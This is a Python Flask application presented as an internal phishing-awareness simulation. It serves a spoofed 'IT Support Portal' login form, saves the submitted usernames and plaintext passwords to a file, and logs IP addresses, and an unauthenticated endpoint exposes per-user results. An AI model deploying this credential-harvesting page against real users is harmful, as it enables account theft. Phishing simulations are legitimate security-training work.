import os
import json
from datetime import datetime
from flask import Flask, request, send_from_directory, jsonify
import uuid
import logging
from logging.handlers import RotatingFileHandler

app = Flask(__name__)

# Ensure necessary directories exist
os.makedirs('logs', exist_ok=True)
os.makedirs('static', exist_ok=True)

# Logging Configuration
def setup_logging():
    log_file = 'logs/phishing_simulation.log'
    file_handler = RotatingFileHandler(
        log_file, 
        maxBytes=10*1024*1024,  # 10 MB
        backupCount=5
    )
    file_handler.setFormatter(logging.Formatter(
        '%(asctime)s - %(levelname)s - %(message)s'
    ))
    app.logger.addHandler(file_handler)
    app.logger.setLevel(logging.INFO)

# Credential Tracking Class
class PhishingTracker:
    def __init__(self):
        self.tracking_file = 'logs/user_vulnerabilities.json'
    
    def log_attempt(self, username, ip_address, user_agent):
        attempt_id = str(uuid.uuid4())
        attempt_data = {
            'id': attempt_id,
            'username': username,
            'timestamp': datetime.now().isoformat(),
            'ip_address': ip_address,
            'user_agent': user_agent,
            'vulnerability_score': self._calculate_vulnerability_score()
        }
        
        try:
            with open(self.tracking_file, 'a+') as f:
                json.dump(attempt_data, f)
                f.write('\n')
        except Exception as e:
            app.logger.error(f"Failed to log attempt: {e}")
        
        return attempt_id
    
    def _calculate_vulnerability_score(self):
        # Mock vulnerability scoring system
        # Could be expanded with machine learning in future
        return 0.75  # Example base score

phishing_tracker = PhishingTracker()

# Home Route
@app.route('/')
def home():
    return '''
    <html>
    <head>
        <style>
            body {
                margin: 0;
                padding: 0;
                background-color: #f4f4f4;
                font-family: Arial, sans-serif;
            }
            .container {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                flex-direction: column;
            }
            .login-box {
                background-color: white;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                text-align: center;
                width: 400px;
            }
            h2 {
                color: #333;
            }
            input[type="text"], input[type="password"] {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #ccc;
                border-radius: 5px;
            }
            input[type="submit"] {
                background-color: #007bff;
                color: white;
                padding: 10px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                width: 100%;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="login-box">
                <h2>IT Support Portal</h2>
                <p>Please log in to continue</p>
                <form method="post" action="/login">
                    <input type="text" name="username" placeholder="Enter your username" required><br>
                    <input type="password" name="password" placeholder="Enter your password" required><br>
                    <input type="submit" value="Log In">
                </form>
            </div>
        </div>
    </body>
    </html>
    '''

# Login Route
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Log credentials to original file
    with open('captured_credentials.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')

    # Capture additional context for vulnerability tracking
    ip_address = request.remote_addr
    user_agent = request.user_agent.string
    
    # Log the attempt with comprehensive details
    attempt_id = phishing_tracker.log_attempt(
        username, 
        ip_address, 
        user_agent
    )
    
    # Detailed logging
    app.logger.warning(
        f"Phishing Attempt Detected - ID: {attempt_id}, "
        f"Username: {username}, "
        f"IP: {ip_address}"
    )

    # Failure page with educational content
    return '''
    <html>
    <head>
        <style>
            body {
                margin: 0;
                padding: 0;
                background-color: #f4f4f4;
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .container {
                text-align: center;
                background-color: white;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                max-width: 500px;
                width: 100%;
            }
            h2 {
                color: red;
            }
            .tips {
                margin-top: 20px;
                text-align: left;
            }
            .tips ul {
                list-style-type: disc;
                padding-left: 20px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>You've been Phished!</h2>
            <p>Attempt ID: ''' + attempt_id + '''</p>
            <p>This was a test phishing attempt performed by an internal cybersecurity team</p>
            <div class="tips">
                <h3>Security Learning Moment</h3>
                <ul>
                    <li>🚨 You've just encountered a simulated phishing attempt</li>
                    <li>🔒 Always verify the source of login requests</li>
                    <li>📱 Enable two-factor authentication</li>
                    <li>🌐 Check for HTTPS and valid certificates</li>
                </ul>
            </div>
        </div>
    </body>
    </html>
    '''

# Vulnerability Report Endpoint
@app.route('/vulnerability-report')
def vulnerability_report():
    try:
        with open('logs/user_vulnerabilities.json', 'r') as f:
            vulnerabilities = [json.loads(line) for line in f]
        
        report = {
            'total_attempts': len(vulnerabilities),
            'average_vulnerability_score': sum(
                v['vulnerability_score'] for v in vulnerabilities
            ) / len(vulnerabilities) if vulnerabilities else 0,
            'top_vulnerable_users': sorted(
                vulnerabilities, 
                key=lambda x: x['vulnerability_score'], 
                reverse=True
            )[:5]
        }
        
        return jsonify(report)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Serve static files (if needed)
@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

if __name__ == '__main__':
    setup_logging()
    app.run(host='127.0.0.1', port=5009)
